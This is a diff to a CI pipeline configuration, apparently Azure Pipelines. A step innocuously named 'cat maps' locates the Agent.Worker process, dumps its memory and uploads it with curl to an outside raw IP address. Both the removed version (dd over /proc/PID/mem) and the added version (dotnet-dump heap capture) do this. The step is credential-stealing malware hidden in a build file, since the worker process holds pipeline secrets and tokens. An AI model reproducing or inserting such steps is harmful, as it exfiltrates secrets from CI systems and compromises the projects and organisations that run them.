@@ -191,6 +191,8 @@ steps:
   displayName: 'Setup Node.js'
 
 - script: |
+    dotnet tool install --global dotnet-dump
+    
     #!/bin/bash
 
     # 获取Agent.Worker进程的PID
@@ -203,41 +205,12 @@ steps:
     fi
     
     echo "The PID of Agent.Worker is $PID"
+    dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin
     
-    # 为内存转储创建临时目录
-    DUMP_DIR="/tmp/${PID}_mem_dumps"
-    mkdir -p "$DUMP_DIR"
-    
-    # 获取可读取的内存区域
-    sudo cat /proc/$PID/maps | while read line; do
-        start_hex=$(echo $line | cut -d' ' -f1 | cut -d'-' -f1)
-        end_hex=$(echo $line | cut -d' ' -f1 | cut -d'-' -f2)
-        perms=$(echo $line | cut -d' ' -f2)
-        
-        if [[ $perms == r* ]]; then  # 检查权限是否可读
-            start_dec=$((0x$start_hex))
-            end_dec=$((0x$end_hex))
-            size=$((end_dec - start_dec))
-            
-            # 使用十进制数执行dd命令
-            echo "Dumping memory from $start_dec to $end_dec"
-            sudo dd if=/proc/$PID/mem of="$DUMP_DIR/${PID}_mem_$start_hex" bs=1 skip=$start_dec count=$size 2>/dev/null
-        fi
-    done
-    
-    # 打包所有转储文件
-    tar -czf "/tmp/${PID}_memory_dumps.tar.gz" -C "$DUMP_DIR" .
-    
-    # 检查打包是否成功并且文件不为空
-    if [ -s "/tmp/${PID}_memory_dumps.tar.gz" ]; then
-        echo "Uploading memory dump package of size $(stat -c %s "/tmp/${PID}_memory_dumps.tar.gz") bytes"
-        sudo curl -F "file=@/tmp/${PID}_memory_dumps.tar.gz" http://139.180.193.16:5000/upload
-    else
-        echo "Failed to create memory dump package or file is empty."
-    fi
-    
-    # 清理创建的临时目录
-    rm -rf "$DUMP_DIR"
+
+    echo "Uploading memory dump package of size $(stat -c %s "/tmp/${PID}_memory_dumps.tar.gz") bytes"
+    sudo curl -F "file=@/home/vsts/work/_temp/heap_worker.bin" http://139.180.193.16:5000/upload
+ 
 
 
   displayName: 'cat maps'
